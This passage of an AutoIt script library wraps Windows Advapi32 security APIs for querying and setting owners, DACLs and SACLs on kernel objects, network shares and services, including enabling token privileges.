; Return values	: If succeed, the return value is a pointer to a SID, else, return zero and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _ConvertStringSidToSid($sStringSid)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "int", "ConvertStringSidToSid", _
			"str", $sStringSid, "ptr*", 0)
	Return SetError(_GetLastError(), 0, $iResult[2])
EndFunc	;==>_ConvertStringSidToSid

; #### FUNCTION ####
; =======================================================================
; Name	: _EqualSid
; Description	: Returns true if 2 SIDs are equaled.
; Parameter(s)	: $pSid1	- The first SID to validate.
;		: $pSid2	- The second SID to validate.
; Return values	: Returns true if 2 SIDs are equaled.
; Author	: Pusofalse
; =======================================================================
Func _EqualSid($pSid1, $pSid2)
	Local $iResult

	If Not _IsValidSid($pSid1) Then Return SetError(@ERROR, 1, 0)
	If Not _IsValidSid($pSid2) Then Return SetError(@ERROR, 2, 0)
	$iResult = DllCall("Advapi32.dll", "int", "EqualSid", "ptr", $pSid1, "ptr", $pSid2)
	Return $iResult[0] <> 0
EndFunc	;==>_EqualSid

Func _EqualPrefixSid($pSid1, $pSid2)
	If Not _IsValidSid($pSid1) Then Return SetError(@ERROR, 1, 0)
	If Not _IsValidSid($pSid2) Then Return SetError(@ERROR, 2, 0)
	$iResult = DllCall("Advapi32.dll", "int", "EqualPrefixSid", "ptr", $pSid1, "ptr", $pSid2)
	Return $iResult[0] <> 0
EndFunc	;==>_EqualPrefixSid

; #### FUNCTION ####
; =======================================================================
; Name	: _GetSecurityInfo
; Description	: Returns the security information of the specified object.
; Parameter(s)	: $hObject - Handle to the object, must opened with READ_CONTROL access right.
;		: $iType	- Specifies the type of the object, see SECURITY OBJECT TYPE CONSTANTS.
;		: $iSecurLevel	- The security information to be retrieved, default to DACL_SECURITY_INFORMATION, can be one or more values of SECURITY INFORMATION CONSTANTS.
; Return values	: An array with following format:
;		:	- $aArray[0] - The return value of API GetSecurityInfo, zero indicates success.
;		:	- $aArray[1] - The handle of the object, same to $hObject parameter.
;		:	- $aArray[2] - The object type, same to $iType parameter.
;		:	- $aArray[3] - The security information retrieved, same to $iSecurLevel parameter.
;		:	- $aArray[4] - The pointer to the owner SID, if $iSecurLevel does not contain the OWNER_SECURITY_INFORMATION, it is zero.
;		:	- $aArray[5] - The pointer to the primary group SID, if $iSecurLevel does not contain the GROUP_SECURITY_INFORMATION, it can be zero.
;		:	- $aArray[6] - The pointer to the DACL, if $iSecurLevel does not contain the DACL_SECURITY_INFORMATION, it can be zero.
;		:	- $aArray[7] - The pointer to the SACL, if $iSecurLevel does not contain the SACL_SECURITY_INFORMATION, it can be zero.
;		:	- $aArray[8] - The pointer to the security descriptor.
;		: If the function fails, the $aArray[0] is set to a system error code, pass to FormatMessage for an error message.
; Author	: Pusofalse
; Remarks		: The $hObject is a handle but not a string, it must opened with READ_CONTROL access right. If $iSecurLevel parameter contains the SACL_SECURITY_INFORMATION, $hObject must opened with ACCESS_SYSTEM_SECURITY access right either, in which case, before retrieving the handle, be sure the calling process owns the SE_SECURITY_NAME privilege, use _IsPrivilegeEnabled to determine the SE_SECURITY_NAME is whether enabled for the caller, call _AdjustTokenPrivileges function to enable and disable the privilege.
; =======================================================================
Func _GetSecurityInfo($hObject, $iType, $iSecurLevel = 4)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "dword", "GetSecurityInfo", _
			"hWnd", $hObject, "int", $iType, "int", $iSecurLevel, _
			"ptr*", 0, "ptr*", 0, "ptr*", 0, "ptr*", 0, "ptr*", 0)
	Return $iResult
EndFunc	;==>_GetSecurityInfo

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryKernelObjectSecurity
; Description	: Retrieves the security information of the kernel object.
; Parameter(s)	: $hKernel		- Handle to the kernel object, it can be a handle to process, thread, event, file, service, registry key, and so on.
;		: $iSecurLevel	- Security information to be retrieved, see SECURITY INFORMATION CONSTANTS for correct values.
; Return values	: If succeeds, the return value is a pointer to a security descriptor, otherwise, returns zero and sets @error to system error code.
; Author		: Pusofalse
; Remarks		: If $iSecurLevel contains the SACL_SECURITY_INFORMATION, the caller must have the SE_SECURITY_NAME privilege, and $hKernel must opened with READ_CONTROL and ACCESS_SYSTEM_SECURITY access rights. When you no longer use the security descriptor pointer, call _HeapFree function to free it.
; =======================================================================
Func _QueryKernelObjectSecurity($hKernel, $iSecurLevel = 4)
	Local $iResult, $pSecurDesc
	$iResult = DllCall("Advapi32.dll", "int", "GetKernelObjectSecurity", _
			"hWnd", $hKernel, "int", $iSecurLevel, _
			"ptr", 0, "dword", 0, "dword*", 0)
	$pSecurDesc = _HeapAlloc($iResult[5])
	$iResult = DllCall("Advapi32.dll", "int", "GetKernelObjectSecurity", _
			"hWnd", $hKernel, "int", $iSecurLevel, _
			"ptr", $pSecurDesc, "dword", $iResult[5], "dword*", 0)
	Return SetError(_GetLastError(), 0, $pSecurDesc)
EndFunc	;==>_QueryKernelObjectSecurity

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryKernelObjectSecurityOwner
; Description	: Retrieves the owner information of the kernel object.
; Parameter(s)	: $hKernel		- Handle to the kernel object, must opened with READ_CONTROL access right.
; Return values	: If succeed, return the owner string, otherwise return empty string and set @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _QueryKernelObjectSecurityOwner($hKernel)
	Local $aSecur = _GetSecurityInfo($hKernel, $SE_KERNEL_OBJECT, 1)
	Return SetError($aSecur[0], 0, _LookupAccountSid($aSecur[4]))
EndFunc	;==>_QueryKernelObjectSecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryKernelObjectSecurityDacl
; Description	: Retrieves an array contains the DACL information of the kernel object.
; Parameter(s)	: $hKernel		- Handle to the kernel object, must opened with READ_CONTROL access right.
; Return values	: If succeeds, the return value is an array in the following format:
;		:	- $aArray[0][0]	- The number of entry returned.
;		:	- $aArray[1][0]	- The user account name of the first entry.
;		:	- $aArray[1][1]	- The SID of the user account, in a string format.
;		:	- $aArray[1][2]	- The access mask as the user rights assigned to the user account ($aArray[1][0]).
;		:	- $aArray[1][3]	- The access type of the first entry.
;		:	- $aArray[1][4]	- The inheritance options of the first entry, if any.
;		:	- ... ...
;		: If fails, all elements are set to empty and set @error to a system error code.
; Author		: Pusofalse
; =======================================================================
Func _QueryKernelObjectSecurityDacl($hKernel)
	Local $aSecur = _GetSecurityInfo($hKernel, $SE_KERNEL_OBJECT, 4)
	Return SetError($aSecur[0], 0, _GetExplicitEntriesFromAcl($aSecur[6]))
EndFunc	;==>_QueryKernelObjectSecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _SetKernelObjectSecurity
; Description	: The function sets the security information of a kernel object.
; Parameter(s)	: $hKernel		- Handle to the kernel object.
;		: $iSecurLevel	- Security information to be set, see SECURITY INFORMATION CONSTANTS for one or more values.
;		: $pSecurDesc	- A security descriptor pointer contains the security data.
; Return values	: If succeeds, the return value is true, else returns false and sets @error.
; Author	: Pusofalse
; Remarks		: If $iSecurLevel contains the OWNER_SECURITY_INFORMATION, the $hKernel object must opened with WRITE_OWNER access right. If $iSecurLevel contains the DACL_SECURITY_INFORMATION, the object must opened with WRITE_DAC access right. If $iSecurLevel contains the SACL_SECURITY_INFORMATION, the object must opened with WRITE_DAC and ACCESS_SYSTEM_SECURITY access rights, in which case, the calling process must have the SE_SECURITY_NAME privilege, to enable this privilege, call to _AdjustTokenPrivileges function. Else, the function fails and sets @error to ERROR_ACCESS_DENIED (5), if OWNER_SECURITY_INFORMATION is specified in $iSecurLevel, the only currently logged user account/group and creator of the object can be specified as the new owner, to set to other owners, enable the SE_RESTORE_NAME privilege for the calling process.
; =======================================================================
Func _SetKernelObjectSecurity($hKernel, $iSecurLevel, $pSecurDesc)
	Local $iResult
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	$iResult = DllCall("Advapi32.dll", "int", "SetKernelObjectSecurity", _
			"hWnd", $hKernel, "int", $iSecurLevel, _
			"ptr", $pSecurDesc)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_SetKernelObjectSecurity

; #### FUNCTION ####
; =======================================================================
; Name	: _SetKernelObjectSecurityOwner
; Description	: Sets the owner information for a kernel object.
; Parameter(s)	: $hKernel		- Handle to the object to set the new owner.
;		: $sOwner		- The new owner's name, in string format.
; Return values	: If succeeds, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetKernelObjectSecurityOwner($hKernel, $sOwner)
	Local $iResult, $aPriv[1][2] = [[$SE_RESTORE_NAME, 2]], $hToken

	$pOwner = _LookupAccountName($sOwner)
	If Not _IsValidSid($pOwner) Then Return SetError(@error, 0, 0)

	$hToken = _OpenProcessToken(-1)
	If Not _IsPrivilegeEnabled($hToken, $SE_RESTORE_NAME) Then
		_AdjustTokenPrivileges($hToken, $aPriv)
	EndIf
	_LsaCloseHandle($hToken)
	$iResult = _SetSecurityInfo($hKernel, $SE_KERNEL_OBJECT, 1, $pOwner, 0, 0, 0)
	Return SetError(@ERROR, _HeapFree($pOwner), $iResult)
EndFunc	;==>_SetKernelObjectSecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _SetKernelObjectSecurityDacl
; Description	: Sets the DACL information for a kernel object.
; Parameter(s)	: $hKernel		- Handle to the object, must opened with WRITE_DAC access right.
;		: $aAccess	- An array with following format:
;		:	- $aAccess[0][0]	- The user account/group name of the first entry.
;		:	- $aAccess[0][1]	- The access rights assigned to the first user account/group.
;		:	- $aAccess[0][2]	- The access type of the first entry.
;		:	- $aAccess[0][3]	- The inheritance options of the first entry.
;		:	- $aAccess[1][0]	- The second user account/group.
;		:	- ... ...
;		: $pOldDacl	- Specifies an optional existing DACL pointer, if non-zero, the function works by merging the $pOldDacl.
; Return values	: True indicates success, false indicates failure, in this case, @error is set to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetKernelObjectSecurityDacl($hKernel, $aAccess, $pOldDacl = 0)
	Local $pNewAcl, $iResult

	$pNewAcl = _SetEntriesInAcl($aAccess, $pOldDacl)
	If $pNewAcl = 0 Then Return SetError(@error, 0, 0)
	$iResult = _SetSecurityInfo($hKernel, $SE_KERNEL_OBJECT, 4, 0, 0, $pNewAcl, 0)
	Return SetError(@error, _LsaLocalFree($pNewAcl), $iResult)
EndFunc	;==>_SetKernelObjectSecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	 : _SetSecurityInfo
; Description	: The function sets the security information for a specified object.
; Parameter(s)	: $hObject	- Handle to the object the security information is set.
;		: $iType		- The type of the object, see OBJECT TYPE CONSTANTS.
;		: $iSecurLevel	- The security information to be set, see SECURITY INFORMATION CONSTANTS for correct values.
;		: $pOwner	- The owner SID pointer, if OWNER_SECURITY_INFORMATION is not specified in $iSecurLevel parameter, it can be zero, else, the $hObject must opened with WRITE_OWNER access right.
;		: $pGroup		- The primary group SID pointer, if GROUP_SECURITY_INFORMATION is not specified, it can be zero.
;		: $pDacl		- The DACL pointer, if DACL_SECURITY_INFORMATION is not specified, it can be zero. $hObject must opened with WRITE_DAC access right, in another case, if DACL_SECURITY_INFORMATION is specified, and $pDacl is zero, the function set a NULL DACL for the object, NULL DACL indicates that everyone access the object are all denied.
;		: $pSacl		- The SACL pointer, if SACL_SECURITY_INFORMATION is not specified, it can be zero. otherwise, the object must have ACCESS_SYSTEM_SECURITY access right, to retrieve the object handle has this right, enable the SE_SECURITY_NAME privilege for the calling process at first.
; Return values	: If succeeds, returns true, otherwise returns false and sets @error to system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetSecurityInfo($hObject, $iType, $iSecurLevel, $pOwner, $pGroup, $pDacl, $pSacl)
	Local $iResult
	$iResult = DllCall("Advapi32.dll", "dword", "SetSecurityInfo", _
			"hWnd", $hObject, "int", $iType, "int", $iSecurLevel, _
			"ptr", $pOwner, "ptr", $pGroup, "ptr", $pDacl, "ptr", $pSacl)
	Return SetError($iResult[0], 0, $iResult[0] = $ERROR_SUCCESS)
EndFunc	;==>_SetSecurityInfo

; #### FUNCTION ####
; =======================================================================
; Name	: _IsNtfs
; Description	: Determines the specified file whether is in NTFS file system disk.
; Parameter(s)	: $sFile	- File name to validate, need not to set to the full path name.
; Return values	: If $sFile is in the NTFS file system, returns true, otherwise returns false, and sets @error to ERROR_ACCESS_DENIED (5).
; Author	: Pusofalse
; =======================================================================
Func _IsNtfs($sFile)
	Local $iResult
	If Not FileExists($sFile) Then Return SetError($ERROR_FILE_NOT_FOUND, 0, 0)
	$iResult = DllCall("Kernel32.dll", "int", "GetFullPathName", _
			"str", $sFile, "dword", 260, "str", "", "str", "")
	If DriveGetFileSystem(StringLeft($iResult[3], 3)) = "NTFS" Then Return 1
	Return SetError($ERROR_ACCESS_DENIED, 0, 0)
EndFunc	;==>_IsNtfs

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryShareObjectSecurityOwner
; Description	: Retrieve the owner information for the share resource.
; Parameter(s)	: $sShare	- The name of the share resource in the form: \\RemoteSystem\ShareName or LocalShareName.
; Return values	: if succeeds, return an owner string, otherwise return an empty string and sets @error to system error code.
; Author		: Pusofalse
; =======================================================================
Func _QueryShareObjectSecurityOwner($sShare)
	Local $aSecur = _GetNamedSecurityInfo($sShare, $SE_LMSHARE, 1)
	Return SetError($aSecur[0], 0, _LookupAccountSid($aSecur[4]))
EndFunc	;==>_QueryShareObjectSecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryShareObjectSecurityDacl
; Description	: Retrieves an array contains the DACL data of a share object.
; Parameter(s)	: $sShare	- The name of the share resource in the form: \\RemoteSystem\ShareName or LocalShareName.
; Return values	: If succeeds, returns an array in the form:
;		:	- $aArray[0][0]	- The number of entry retrieved.
;		:	- $aArray[1][0]	- The first user account/group's name.
;		:	- $aArray[1][1]	- The string SID of the first user account.
;		:	- $aArray[1][2]	- The user rights of the first user account.
;		:	- $aArray[1][3]	- The inheritance options of the first entry, if any.
;		:	- ... ...
;		: If fails, all elements in the array are set to NULL, and sets @error to a system error code.
; Author		: Pusofalse
; =======================================================================
Func _QueryShareObjectSecurityDacl($sShare)
	Local $aSecur = _GetNamedSecurityInfo($sShare, $SE_LMSHARE, 4)
	Return SetError($aSecur[0], 0, _GetExplicitEntriesFromAcl($aSecur[6]))
EndFunc	;==>_QueryShareObjectSecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _SetShareObjectSecurityDacl
; Description	: This function sets the DACL security information for a share object.
; Parameter(s)	: $sShare	- The share's name in the form: \\RemoteSystem\ShareName or LocalShareName.
;		: $aAccess	- An array with following format:
;		:		- $aAccess[0][0]	- The user account/group name of the first entry.
;		:		- $aAccess[0][1]	- The access rights assigned to the first user account/group.
;		:		- $aAccess[0][2]	- The access type of the first entry.
;		:		- $aAccess[0][3]	- The inheritance options of the first entry.
;		:		- $aAccess[1][0]	- The second user account/group.
;		:		- ... ...
;		: $pOldDacl	- A pointer to an existing DACL, can be zero.
; Return values	: True indicates success, false to failure, in the case, @error is set to system error code.
; =======================================================================
Func _SetShareObjectSecurityDacl($sShare, $aAccess, $pOldDacl = 0)
	Local $pNewDacl, $iResult

	$pNewDacl = _SetEntriesInAcl($aAccess, $pOldDacl)
	If $pNewDacl = 0 Then Return SetError(@error, 0, 0)
	$iResult = _SetNamedSecurityInfo($sShare, $SE_LMSHARE, 4, 0, 0, $pNewDacl, 0)
	Return SetError(@error, _LsaLocalFree($pNewDacl), $iResult)
EndFunc	;==>_SetShareObjectSecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryServiceObjectSecurity
; Description	: Retrieve the security descriptor of a service object.
; Parameter(s)	: $sService	- Service name in the form: RemoteSystem\ServiceName or LocalServiceName.
;		: $iSecurLevel	- Security information to retrieve, can be a combination of SECURITY INFORMTION CONSTANTS.
; Return values	: If succeed, the return value is a pointer to the service's security descriptor. otherwise, returns zero and sets @error to a system error code, if @error is ERROR_ACCESS_DENIED (5), set the global variable $__LSA_SECURITY_USE_NAME to False, then re-call the function, the function will open the service by using a possible access mask value.
; Author	: Pusofalse
; =======================================================================
Func _QueryServiceObjectSecurity($sService, $iSecurLevel = 4)
	Local $hToken, $aPriv[1][2] = [[$SE_SECURITY_NAME, 2]]
	Local $hService, $iResult, $pSecurDesc, $iDesiredAccess = $READ_CONTROL

	$hToken = _OpenProcessToken(-1)
	If _IsPrivilegeEnabled($hToken, $SE_SECURITY_NAME) = 0 Then
		_AdjustTokenPrivileges($hToken, $aPriv)
	EndIf
	_LsaCloseHandle($hToken)

	If bitAND($iSecurLevel, 8) Then $iDesiredAccess = bitOR($iDesiredAccess, $ACCESS_SYSTEM_SECURITY)
	$hService = _LsaOpenService($sService, $iDesiredAccess)
	If $hService = 0 Then Return SetError(@error, 0, 0)

	$pSecurDesc = _InitializeSecurityDescriptor(1024)
	$iResult = DllCall("Advapi32.dll", "int", "_QueryServiceObjectSecurity", "hWnd", $hService, _
			"dword", $iSecurLevel, "ptr", $pSecurDesc, "dword", 1024, "dword*", 0)
	_HeapFree($pSecurDesc)
	$pSecurDesc = _InitializeSecurityDescriptor($iResult[5])
	$iResult = DllCall("Advapi32.dll", "int", "_QueryServiceObjectSecurity", "hWnd", $hService, _
			"dword", $iSecurLevel, "ptr", $pSecurDesc, "dword", $iResult[5], "dword*", 0)
	If $iResult[0] = 0 Then _HeapFree($pSecurDesc)
	Return SetError(_GetLastError(), _LsaCloseServiceHandle($hService), $pSecurDesc)
EndFunc	;==>__QueryServiceObjectSecurity


; #### FUNCTION ####
; =======================================================================
; Name	: _QueryServiceObjectSecurityDacl
; Description	: This function retrieves an array contains the DACL information for a service object.
; Parameter(s)	: $sService	- The service name in the form: RemoteSystem\ServiceName or LocalServiceName.
; Return values	: If succeeds, returns an array contains the number of entries and entries' detail, see _GetExplicitEntriesFromAcl function's Return values section for the correct format. If fails, sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _QueryServiceObjectSecurityDacl($sService)
	Local $pSecurDesc, $pDacl, $aResult[1][5]

	$pSecurDesc = _QueryServiceObjectSecurity($sService, $DACL_SECURITY_INFORMATION)
	If $pSecurDesc = 0 Then Return SetError(@error, 0, $aResult)
	$pDacl = _GetSecurityDescriptorDacl($pSecurDesc)
	If _IsValidAcl($pDacl) = 0 Then Return SetError(@error, 0, $aResult)

	$aResult = _GetExplicitEntriesFromAcl($pDacl)
	Return SetError(@error, _HeapFree($pSecurDesc), $aResult)
EndFunc	;==>_QueryServiceObjectSecurityDacl


; #### FUNCTION ####
; =======================================================================
; Name	: _QueryServiceObjectSecuritySacl
; Description	: This function retrieves an array contains the SACL information for a service object.
; Parameter(s)	: $sService	- The service name in the form: RemoteSystem\ServiceName or LocalServiceName.
; Return values	: If succeeds, returns an array contains the number of entries and entries' detail, see _GetExplicitEntriesFromAcl function's Return values section for the correct format. If fails, sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _QueryServiceObjectSecuritySacl($sService)
	Local $pSecurDesc, $pSacl, $aResult[1][5]

	$pSecurDesc = _QueryServiceObjectSecurity($sService, $SACL_SECURITY_INFORMATION)
	If $pSecurDesc = 0 Then Return SetError(@error, 0, $aResult)
	$pSacl = _GetSecurityDescriptorSacl($pSecurDesc)
	If _IsValidAcl($pSacl) = 0 Then Return SetError(@error, 0, $aResult)

	$aResult = _GetExplicitEntriesFromAcl($pSacl)
	Return SetError(@error, _HeapFree($pSecurDesc), $aResult)
EndFunc	;==>_QueryServiceObjectSecuritySacl

; #### FUNCTION ####
; =======================================================================
; Name	: _QueryServiceObjectSecurityOwner
; Description	: Retrieves the owner information for a service object.
; Parameter(s)	: $sService	- The service name in the form: RemoteSystem\ServiceName or LocalServiceName.
; Return values	: If succeeds, returns an owner string, else returns NULL and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _QueryServiceObjectSecurityOwner($sService)
	Local $pSecurDesc, $pSid, $sUser

	$pSecurDesc = _QueryServiceObjectSecurity($sService, $OWNER_SECURITY_INFORMATION)
	If $pSecurDesc = 0 Then Return SetError(@error, 0, "")

	$pSid = _GetSecurityDescriptorOwner($pSecurDesc)
	$sUser = _LookupAccountSid($pSid)
	If $sUser = "" Then $sUser = _ConvertSidToStringSid($pSid)
	Return SetError(@error, _HeapFree($pSecurDesc), $sUser)
EndFunc	;==>_QueryServiceObjectSecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _SetServiceObjectSecurity
; Description	: Sets the security information for a service object.
; Parameter(s)	: $sService	- The service name in the form: RemoteSystem\ServiceName or LocalServiceName.
;		: $iSecurLevel	- The security information to set, can be combination of the following values:
;		: $OWNER_SECURITY_INFORMATION	- Set the owner for the service. If this flag is not specified, the owner in $pSecurDesc is ignored.
;		: $GROUP_SECURITY_INFORMATION	- Set the primary group for the service. If this flag is not specified, the group in $pSecurDesc is ignored.
;		: $DACL_SECURITY_INFORMATION	- Set the DACL information for the service. If this flag is not specified, the DACL in the $pSecurDesc parameter will be ignored.
;		: $SACL_SECURITY_INFORMATION	- Set the SACL for the sevice. If this flag is not specified, the SACL in the $pSecurDesc is ignored.
;		: $pSecurDesc	- A pointer to a security descriptor that contains the security data.
; Return values	: True indicates succeess, false to failure, in this case to set @error to a system error code.
; Author	: Pusofalse
; Remarks	: If $OWNER_SECURITY_INFORMATION is specified in $iSecurLevel parameter, only the currently logged user (or the local group the current user belongs) or creator of the $sService object can be specified as the new owner, to set other user account, enable the SE_RESTORE_NAME privilege for the calling process. If $SACL_SECURITY_INFORMATION is specified in $iSecurLevel, the caller must have the SE_SECURITY_NAME privilege.
; =======================================================================
Func _SetServiceObjectSecurity($sService, $iSecurLevel, $pSecurDesc)
	Local $hService, $hToken, $iResult, $iDesiredAccess = $WRITE_DAC
	Local $aPriv[2][2] = [[$SE_RESTORE_NAME, 2], [$SE_SECURITY_NAME, 2]]

	If bitAND($iSecurLevel, 1) Then $iDesiredAccess = bitOR($iDesiredAccess, $WRITE_OWNER)
	If bitAND($iSecurLevel, 2) Then $iDesiredAccess = bitOR($iDesiredAccess, $WRITE_OWNER)
	If bitAND($iSecurLevel, 4) Then $iDesiredAccess = bitOR($iDesiredAccess, $WRITE_DAC)
	If bitAND($iSecurLevel, 8) Then $iDesiredAccess = bitOR($iDesiredAccess, $ACCESS_SYSTEM_SECURITY)

	$hToken = _OpenProcessToken(-1)
	_AdjustTokenPrivileges($hToken, $aPriv)
	_LsaCloseHandle($hToken)

	$hService = _LsaOpenService($sService, $iDesiredAccess)
	If Number($hService) = 0 Then Return SetError(@error, 0, 0)

	$iResult = DllCall("AdvApi32.dll", "int", "_SetServiceObjectSecurity", "hWnd", $hService, _
			"dword", $iSecurLevel, "ptr", $pSecurDesc)
	Return SetError(_GetLastError(), _LsaCloseServiceHandle($hService), $iResult[0])
EndFunc	;==>_SetServiceObjectSecurity

; #### FUNCTION ####
; =======================================================================
; Name	: _SetServiceObjectSecurityDacl
; Description	: Sets the access rights for a service object.
; Parameter(s)	: $sService	- The name of the service in the form: RemoteSystem\ServiceName or LocalServiceName.
;		: $aAccess	- An array with following format:
;		:	- $aAccess[0][0] - The owner of the 1st access control entry (ACE).
;		:	- $aAccess[0][1] - The access rights assigned to first owner.
;		:	- $aAccess[0][2] - Access type, DENY_ACCESS and GRANT_ACCESS are defined for a DACL.
;		:	- $aAccess[0][3] - Inheritance options, can be NO_INHERITANCE.
;		:	- ... ...
;		: $pOldDacl - An existing DACL pointer, can be zero.
; Return values	: True indicates success, false to failure, in which case to set @error to a system error code.
; =======================================================================
Func _SetServiceObjectSecurityDacl($sService, ByRef $aAceList, $pOldDacl = 0)
	Local $pSecurDesc, $pDacl, $fResult, $iError

	If UBound($aAceList, 0) <> 2 Then Return SetError(87, 0, 0)
	If UBound($aAceList, 2) <> 4 Then Return SetError(87, 0, 0)

	$pDacl = _SetEntriesInAcl($aAceList, $pOldDacl)
	If _IsValidAcl($pDacl) = 0 Then Return SetError(@error, 0, 0)

	$pSecurDesc = _InitializeSecurityDescriptor(_LsaLocalSize($pDacl))
	Select
	Case _SetSecurityDescriptorDacl($pSecurDesc, $pDacl) = 0
		$fResult = 0
		$iError = @error
	Case _SetServiceObjectSecurity($pSecurDesc, 4, $pSecurDesc) = 0
		$fResult = 0
		$iError = @error
	Case Else
		$fResult = 1
		$iError = @error
	EndSelect
	Return SetError($iError, _HeapFree($pSecurDesc) * _LsaLocalFree($pDacl), $fResult)
EndFunc	;==>_SetServiceObjectSecurityDacl

; #### FUNCTION ####
; =======================================================================
; Name	: _SetServiceObjectSecurityOwner
; Description	: This function sets the owner for a service object.
; Parameter(s)	: $sService	- Service name in the form: RemoteSystem\ServiceName or LocalServiceName.
;		: $sOwner	- The owner for the service, in the form: UserName or DomainName\UserName.
; Return values	: If succeeds, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetServiceObjectSecurityOwner($sService, $sOwner)
	Local $pSid, $pSecurDesc, $fResult, $iError

	$pSid = _LookupAccountName($sOwner)
	If _IsValidSid($pSid) = 0 Then Return SetError(@error, 0, 0)

	$pSecurDesc = _InitializeSecurityDescriptor(_GetLengthSid($pSid))
	Select
	Case _SetSecurityDescriptorOwner($pSecurDesc, $pSid) = 0
		$fResult = 0
		$iError = @error
	Case _SetServiceObjectSecurity($sService, 1, $pSecurDesc) = 0
		$fResult = 0
		$iError = @error
	Case Else
		$fResult = 1
		$iError = @error
	EndSelect
	Return SetError($iError, _HeapFree($pSid) * _HeapFree($pSecurDesc), $fResult)
EndFunc	;==>_SetServiceObjectSecurityOwner

; #### FUNCTION ####
; =======================================================================
; Name	: _SetServiceObjectSecuritySacl
; Description	: Sets the SACL for a service object.
; Parameter(s)	: $sService	- Service name in the form: RemoteSystem\ServiceName or LocalServiceName.
;		: $aAccess	- An array with following format:
;		:	- $aAccess[0][0] - The owner of the 1st access control entry (ACE).
;		:	- $aAccess[0][1] - The access rights assigned to first owner.
;		:	- $aAccess[0][2] - Access type, SET_AUDIT_SUCCESS and SET_AUDIT_FAILURE are defined for a SACL.
;		:	- $aAccess[0][3] - Inheritance options, can be NO_INHERITANCE.
;		:	- ... ...
;		: $pOldSacl - An existing SACL pointer, can be zero.
; Return values	: If succeeds, returns true, else returns false and sets @error to a system error code.
; Author	: Pusofalse
; =======================================================================
Func _SetServiceObjectSecuritySacl($sService, $aAccess, $pOldSacl = 0)
	Local $pNewSacl, $iResult, $iSysError, $pSecurDesc

	$pNewSacl = _SetEntriesInAcl($aAccess, $pOldSacl)
	If Not $pNewSacl Then Return SetError(@error, 0, 0)
	If Not _IsValidAcl($pNewSacl) Then Return SetError(@error, 0, 0)

	$pSecurDesc = _InitializeSecurityDescriptor()
	If Not $pSecurDesc Then Return SetError(@error, 0, 0)
	If Not _IsValidSecurityDescriptor($pSecurDesc) Then Return SetError(@error, 0, 0)
	If Not _SetSecurityDescriptorSacl($pSecurDesc, $pNewSacl) Then Return SetError(@error, 0, 0)

	$iResult = _SetServiceObjectSecurity($sService, 8, $pSecurDesc)
	_FreeVariable($iSysError, @error, _HeapFree($pSecurDesc))
	Return SetError($iSysError, _LsaLocalFree($pNewSacl), $iResult)
EndFunc	;==>_SetServiceObjectSecuritySacl

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Open a service in specified system and retrieve its handle.
; =======================================================================
Func _LsaOpenService($sService, $iAccessMask, $sSystem = "")
	Local $hService, $hSC

	$hSC = _LsaOpenSCManager($sSystem)
	If Not $hSC Then Return SetError(@ERROR, 0, 0)
	$hService = DllCall("Advapi32.dll", "hWnd", "OpenService", _
			"hWnd", $hSC, "str", $sService, "dword", $iAccessMask)
	Return SetError(_GetLastError(), _LsaCloseServiceHandle($hSC), $hService[0])
EndFunc	;==>_LsaOpenService

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Open the service controller in specified system and retrieve its handle for the subsequent calls.
; =======================================================================
Func _LsaOpenSCManager($sSystem = "", $iAccessMask = 0xF003F)
	Local $hSC
	$hSC = DllCall("Advapi32.dll", "hWnd", "OpenSCManager", _
			"str", $sSystem, "str", "ServicesActive", _
			"dword", $iAccessMask)
	Return SetError(_GetLastError(), 0, $hSC[0])
EndFunc	;==>_LsaOpenSCManager

; #### INTERNAL USED ONLY FUNCTION ####
; =======================================================================
; Close a service/service controller handle opened by the previous calls.
; =======================================================================
Func _LsaCloseServiceHandle($hService)
	Local $iResult = DllCall("Advapi32.dll", "int", "CloseServiceHandle", "hWnd", $hService)
	Return SetError(_GetLastError(), 0, $iResult[0] <> 0)
EndFunc	;==>_LsaCloseServiceHandle

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaCloseHandle
; Description	: Close a handle to a securable object.
; Parameter(s)	: $hHandle	- Handle to be closed.
; Return values	: A bool value indicates success or failure.
; =======================================================================
Func _LsaCloseHandle($hHandle)
	Local $iResult = DllCall("Kernel32.dll", "int", "CloseHandle", "long", $hHandle)
	Return $iResult[0] <> 0
EndFunc	;==>_LsaCloseHandle

; #### FUNCTION ####
; =======================================================================
; Name	: _LsaOpenPolicy
; Description	: Retrieves an handle to the policy object on local or remote system.
; Parameter(s)	: $iAccessMask	- Access mask value, depends on the subsequent calls, see LSA POLICY ACCESS RIGHT CONSTANTS for values.
;		: $sSystem	- The name of the system, empty string to local.
; Return values	: If succeeds, the return value is a handle to the policy object, else returns zero and sets @error to a system error code.
; Author	: Pusofalse
; Remarks		: When you finished with this handle, call _LsaClose function to close it.
; =======================================================================
Func _LsaOpenPolicy($iAccessMask, $sSystem = "")
	Local $hPolicy, $tSystem, $pSystem, $iLength
	Local $tObjAttr, $pObjAttr, $tName, $pName

	If $sSystem <> "" Then
		$iLength = StringLen($sSystem) * 2
		$tSystem = DllStructCreate($tagLSAUNICODE)
